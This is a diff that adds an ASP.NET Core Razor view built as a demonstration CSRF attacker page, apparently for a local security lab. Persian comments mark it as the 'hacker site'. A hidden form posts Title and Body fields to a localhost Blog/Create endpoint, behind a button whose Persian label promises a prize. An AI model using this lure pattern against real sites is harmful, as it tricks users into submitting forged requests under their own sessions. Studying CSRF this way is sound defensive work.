@@ -1,0 +1,15 @@
+﻿@* View for CSRF Attacks *@
+@{
+    ViewData["Title"] = "Home Page";
+}
+<h1 style="color:red">سایت هکر</h1>@* برای اینکه خودمون موقع تست متوجه بشیم *@
+<div class="text-center">
+    <h1 class="display-4">Welcome</h1>
+    <p>Learn about <a href="https://learn.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+</div>
+
+<form action="https://localhost:44391/Blog/Create" method="post"> @* آدرس سایت هدف *@
+    <input type="hidden" name="Title" value="..." />@* بستگی به هدف هکر داره value*@
+    <input type="hidden" name="Body" value="..."/>
+    <button type="submit" class="btn btn-success">برای دریافت جایزه کلیک کنید</button>
+</form>
